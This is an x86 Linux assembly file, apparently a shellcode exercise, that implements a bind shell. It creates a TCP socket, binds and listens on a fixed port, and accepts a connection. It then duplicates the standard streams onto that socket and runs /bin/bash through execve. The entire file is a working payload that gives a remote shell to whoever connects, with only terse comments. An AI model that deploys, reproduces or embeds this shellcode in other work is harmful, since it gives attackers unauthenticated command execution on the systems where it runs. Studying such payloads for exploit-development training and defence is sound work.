;port_bind.nasm


;socket
;bind
;listen 
;accept
;dup
;execve



global _start

section .text

_start:

	; int socketcall(int call, unsigned long *args);

	xor eax , eax 
	mov BYTE al, 0x66 ;system call: socketcall

	; sockfd = socket(int socket_family, int socket_type, int protocol);
	; int socket(int domain, int type, int protocol);

	; AF_INET = 2
	; SOCK_STREAM = 1
	; PROTOCOL = 0

	xor ebx, ebx 
	push ebx
	push 1
	push 2
	mov bl , 1
	mov ecx, esp	; mov stack to ECX register
	int 0x80		; initiate interrupt

	mov esi, eax    ; save the returned socket file descriptor

	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;           struct sockaddr {
    ;           sa_family_t sa_family;
    ;           char        sa_data[14];
    ;       }

_bind:

    inc ebx 			; 0x2 - system call bind
 	mov BYTE al, 0x66   
    xor edx, edx
    push edx			; push 0
    push word 0x697a			; push port
    push word bx			; push family
    mov ecx, esp    	; server struct pointer

    push 0x10 			; Address len 
    push ecx			; Server Struct pointer
    push esi  			; Socket file descriptor
    mov ecx, esp		; put stack in ECX
    int 0x80

_listen:

    ; int listen(int sockfd, int backlog);
    mov al, 0x66
    inc ebx
    mov bl , 4		; System call 4 : listen()
    push ebx 		; Backlog = 4
    push esi 		; Socket file descriptor
    mov ecx, esp 	; put stack in ECX
    int 0x80

 _accept:

    ; c = accept(s,0,0)
    mov al, 0x66
    inc ebx 		; ebx = 5 = SYS_ACCEPT - accept()
    xor edx, edx 	
    push edx
    push edx
    push esi
    mov ecx, esp 
    int 0x80

_dup2:

    ; dup2 (63)
    xchg ebx,eax

	xor eax, eax
	mov byte al, 0x3f
	;mov ebx, esi
	xor ecx, ecx
    int 0x80

    mov byte al, 0x3f
    inc ecx
    int 0x80

    mov byte al, 0x3f
    inc ecx
    int 0x80

_execve:


	; PUSH the first null dword 
	xor eax, eax
	push eax

	; PUSH ////bin/bash (12) 

	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f


	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp


	mov al, 11
	int 0x80




